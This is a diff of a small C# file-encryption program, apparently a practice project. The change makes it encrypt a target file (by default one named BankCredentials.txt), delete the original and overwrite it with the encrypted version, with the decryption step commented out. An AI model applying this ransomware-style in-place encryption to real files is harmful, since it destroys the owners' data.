@@ -5,6 +5,7 @@ internal static class Program
     private static async Task Main(string[] args)
     {
         Console.WriteLine(Directory.GetCurrentDirectory());
+        if(args.Length == 0)
         args =
         [
             $"..{Path.DirectorySeparatorChar}..{Path.DirectorySeparatorChar}..{Path.DirectorySeparatorChar}RandomFiles{Path.DirectorySeparatorChar}BankCredentials.txt"
@@ -12,13 +13,15 @@ internal static class Program
         var inputManager = new InputManager(args);
         var fileToEncryptPath = inputManager.GetFileToEncryptPath();
         var encryptedFilePath = fileToEncryptPath + "2";
-        var decryptedFilePath = fileToEncryptPath + "3";
+        // var encryptedFilePath = fileToEncryptPath;
+        // var decryptedFilePath = fileToEncryptPath + "3";
         
         Console.WriteLine($"File found : {fileToEncryptPath}");
 
         await FileEncrypter.EncryptAndWriteToPath(fileToEncryptPath, encryptedFilePath);
-        await FileDecrypter.DecryptAndWriteToPath(encryptedFilePath, decryptedFilePath);
+        // await FileDecrypter.DecryptAndWriteToPath(encryptedFilePath, decryptedFilePath);
         
-        Console.ReadLine();
+        File.Delete(fileToEncryptPath);
+        File.Move(encryptedFilePath,fileToEncryptPath);
     }
 }
